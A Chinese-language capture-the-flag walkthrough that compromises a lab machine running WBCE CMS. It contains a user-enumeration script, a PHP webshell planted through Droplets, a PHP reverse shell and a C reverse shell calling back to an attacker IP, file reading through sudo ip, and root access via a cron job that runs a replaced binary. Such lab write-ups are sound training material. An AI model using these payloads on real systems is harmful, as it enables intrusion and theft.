# 信息收集

```bash
IP=10.216.75.104
nmap -p0-65535 $IP
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

三个端口，SSH、HTTP、MySQL 全开着。用 rustscan 跑一遍详细信息。

```bash
rustscan -a $IP --ulimit 5000 -- -A -sC -sV
```

关键信息：SSH 是 OpenSSH 10.0，HTTP 是 Apache 2.4.66 跑在 Unix 上，页面标题写着 "Dairy - Website Baker"，MySQL 是 MariaDB 11.4.8，认证插件用的 mysql_native_password。MAC 地址 `08:00:27` 开头，VirtualBox 虚拟机没跑了。

浏览器访问 80 端口，页面加载不完整，搜索功能跳转到了 `baker.dsz` 这个域名。加一条 hosts 记录。

```bash
echo "10.216.75.104 baker.dsz" | sudo tee -a /etc/hosts
```

刷新页面，网站正常加载出来了。页面上有一句话很显眼：

> We will run the TRUNCATE TABLE wbce_blocking command at 1-minute intervals.

这句话当时没太在意，后来发现它是理解登录封锁机制的关键。

# 目录扫描

```bash
dirsearch -u http://baker.dsz -e "*"
```

扫出来的有用路径不多，主要几个：

- `/.gitignore` 200
- `/admin/` 302 跳转到 `/admin/start/index.php`
- `/account/` 301 跳到 `login.php`
- `/CHANGELOG.md` 200
- `/INSTALL.md` 200
- `/README.md` 200
- `/config.php` 200 但内容为空（PHP 被执行了）
- `/media/` 200 可列目录
- `/var/logs/` 200

翻了一圈这些文件，`README.md` 里提到了邮箱格式的 hint，`CHANGELOG.md` 确认 CMS 是 WBCE CMS。访问 `/admin/` 能看到后台登录页。

# 用户名枚举

后台有个忘记密码功能在 `/admin/login/forgot/index.php`，带一个文本验证码（类似 "9 multiply 5" 这种）。关键在于：输入不存在的邮箱会返回 "The email that you entered cannot be found in the database"，而邮箱存在则返回不同的提示。这就能拿来枚举用户。

结合 `README.md` 里的邮箱格式 `[username]@baker.dsz`，写个脚本跑一下。保存为 `enum.py`：

```python
import requests
import re

url = "http://baker.dsz/admin/login/forgot/index.php"
calc = {'subtract': '-', 'multiply': '*', 'add': '+'}
wordlist = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
domains = ["baker.dsz", "baker.local"]

with open(wordlist, "r", errors="ignore") as f:
    count = 0
    for line in f:
        name = line.strip()
        if not name:
            continue
        for domain in domains:
            count += 1
            try:
                sess = requests.session()
                resp = sess.get(url, timeout=5)
                r1 = re.findall(b'>\n\t\t\t\t\t\t\t(.*?)\t\t\t\t\t\t', resp.content)
                if not r1:
                    continue
                parts = r1[0].decode().split(' ')
                captcha_val = eval(f'{parts[0]}{calc[parts[1]]}{parts[2]}')
                data = {'email': f'{name}@{domain}', 'captcha': captcha_val, 'submit': 'Send Details'}
                resp2 = sess.post(url, data=data, timeout=5)
                if "cannot be found in the database" not in resp2.text:
                    print(f"[+] Found: {name}@{domain}")
            except Exception:
                pass
            if count % 100 == 0:
                print(f"[{count}] checking {name}@{domain}")

```

```bash
python3 enum.py
```

跑出来两个有效用户：`carol@baker.dsz` 和 `martina@baker.dsz`。

# MySQL 弱口令

在爆破登录密码之前，我先试了一下 3306 端口。MySQL 开着嘛，万一弱口令呢。

```bash
mysql -h $IP -u root -proot
```

还真进去了，`root:root` 直接登录成功。不过权限很有限，`wbce_db` 库完全没权限读，只能看 `wbce_test` 库。翻了一下表结构，`wbce_users` 表里有一条记录：

```
user_id: 1
username: admin
email: admin@baker.local
password: $2y$10$NwaR46o119WADcffpS5M8.qTCmNaCqx3Ga6M1wKQJEhy7pUufnO9u
```

拿到一个 bcrypt 哈希，丢给 john 跑一下。

```bash
echo '$2y$10$NwaR46o119WADcffpS5M8.qTCmNaCqx3Ga6M1wKQJEhy7pUufnO9u' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
?:33333333
1 password hash cracked, 0 left
```

爆出明文 `33333333`。拿这个密码去后台登 admin 账号，结果提示密码不正确。这里卡了一下，后来想明白了：`wbce_test` 库大概率是测试库，里面的 admin 哈希和生产库 `wbce_db` 里的不一定一致。但这个密码 `33333333` 可能是其他用户在用的。

拿 `carol:33333333` 和 `martina:33333333` 分别试了一下后台登录，都能进。carol 是管理员权限，martina 是低权限用户。

# 登录封锁机制

这里补一个踩坑的点。后台登录错误几次之后会直接封 IP，返回 "Excessive Invalid Logins"。当时觉得挺烦的，后来回想起首页那句话：

> We will run the TRUNCATE TABLE wbce_blocking command at 1-minute intervals.

也就是说 `wbce_blocking` 表每分钟被清空一次，被封之后等大约一分钟就自动解封了。如果要爆破密码的话，每两次尝试之间 sleep 62 秒就行，虽然慢但能跑通。不过我这里因为已经从数据库拿到了密码，没再走爆破这条路。

# 后台 Getshell

用 carol 的管理员账号登进后台之后，WBCE CMS 1.6.x 有个已知的 RCE 路径：通过 Droplets 功能写入 PHP 代码，再在页面中调用执行。对应 ExploitDB 上的 52489。

操作步骤是这样的：进 Admin-tools 里的 Droplets，新建一个 Droplet，名字叫 `shell`，内容写一个 webshell：

```php
<?php system($_GET['cmd']); return ''; ?>
```

保存之后，去 Pages 新建一个页面，名字随便起比如 `test`，页面内容里写上 `[[shell]]` 调用这个 Droplet。

访问 `http://baker.dsz/pages/test.php?cmd=id` 验证一下，能看到命令执行回显，当前用户是 `apache`。

拿到 user flag：

```bash
curl "http://baker.dsz/pages/test.php?cmd=cat+/home/carol/user.txt"
```

# apache 到 carol

用 webshell 弹一个交互式 shell 过来。kali 上监听：

```bash
nc -lvnp 8888
```

通过 webshell 触发反弹：

```
http://baker.dsz/pages/test.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.216.75.80%22%2C8888)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
```

拿到 apache 用户的 shell 之后，看一下 sudo 权限。

```bash
sudo -l
```

```
User apache may run the following commands on Baker:
    (carol) NOPASSWD: /sbin/ip
```

可以用 carol 身份无密码执行 `/sbin/ip`。GTFOBins 上有 ip 命令的文件读取利用方式：`ip -force -batch <file>` 会把文件每一行当作 ip 子命令解析，解析失败时错误信息里会带上该行的完整内容，加 `-force` 遇错不停继续处理后续行。等于能逐行泄露任意文件。

读 carol 的 SSH 私钥：

```bash
sudo -u carol /sbin/ip -force -batch /home/carol/.ssh/id_rsa 2>&1
```

每一行都报 `Object "xxx" is unknown`，但私钥内容全部泄露出来了。把输出清理一下，去掉 `Object "` 前缀和 `" is unknown, try "ip help".` 后缀，去掉 `Command failed` 行，拼回完整的 OpenSSH 私钥。

保存为 `carol.key`，SSH 登录：

```bash
chmod 600 carol.key
ssh -i carol.key carol@$IP
```

登录成功，拿到 carol 的 shell。

# carol 到 root

## 定时任务分析

传个 pspy64 上去看有没有定时任务。

```bash
chmod +x /tmp/pspy64 && /tmp/pspy64
```

每分钟都会看到这几行：

```
CMD: UID=0 | /bin/bash -c /usr/local/bin/check-monitor.sh
CMD: UID=0 | objcopy --dump-section .note.sig=/tmp/sig_verify.bin /opt/scripts/monitor
CMD: UID=0 | grep -q Maze-Sec-Internal-Only /tmp/sig_verify.bin
CMD: UID=0 | /opt/scripts/monitor
```

root 的 cron 每分钟执行 `/usr/local/bin/check-monitor.sh`。看一下这个脚本的内容：

```bash
cat /usr/local/bin/check-monitor.sh
```

```bash
#!/bin/sh
TARGET="/opt/scripts/monitor"
SIG_SECTION=".note.sig"
TEMP_SIG="/tmp/sig_verify.bin"
VENDOR_STR="Maze-Sec-Internal-Only"

objcopy --dump-section $SIG_SECTION=$TEMP_SIG $TARGET 2>/dev/null
if [ $? -ne 0 ]; then
    echo "[!] Error: Binary not signed."
    exit 1
fi
if grep -q "$VENDOR_STR" $TEMP_SIG; then
    echo "[+] Signature verified. Executing..."
    $TARGET
else
    echo "[!] Security Alert: Unauthorized binary detected!"
fi
rm -f $TEMP_SIG
```

逻辑很清楚：用 objcopy 从 `/opt/scripts/monitor` 提取 `.note.sig` 这个 ELF section，检查里面是否包含 `Maze-Sec-Internal-Only` 字符串，包含就以 root 身份执行这个二进制。

看一下目录权限：

```bash
ls -ld /opt/scripts/
```

```
drwxrwxr-x    2 root     devs        4096 ... /opt/scripts/
```

carol 属于 devs 组，对这个目录有写权限，可以替换 monitor 文件。只要替换上去的二进制包含正确签名的 `.note.sig` section，就能通过检查被 root 执行。

## 构造恶意 monitor

写一个 C 程序弹反弹 shell。保存为 `/tmp/exploit.c`：

```c
#include <unistd.h>
#include <stdlib.h>
int main() {
    setuid(0);
    setgid(0);
    system("bash -c 'bash -i >& /dev/tcp/10.216.75.80/8888 0>&1'");
    return 0;
}
```

编译，创建签名数据，用 objcopy 注入 `.note.sig` section，替换 monitor：

```bash
gcc /tmp/exploit.c -o /tmp/monitor_bin
echo "Maze-Sec-Internal-Only" > /tmp/sig
objcopy --add-section .note.sig=/tmp/sig --set-section-flags .note.sig=alloc,readonly /tmp/monitor_bin /tmp/monitor_signed
cp /tmp/monitor_signed /opt/scripts/monitor
chmod +x /opt/scripts/monitor
```

kali 上监听：

```bash
nc -lvnp 8888
```

等不到一分钟，cron 触发，shell 弹回来了。

```
id
uid=0(root) gid=0(root)
```

```
cat /root/root.txt /home/carol/user.txt
flag{root-99dc32aab0563305b639550763a02e32}
flag{user-548b5242171e085fc64be9252a132ad5}
```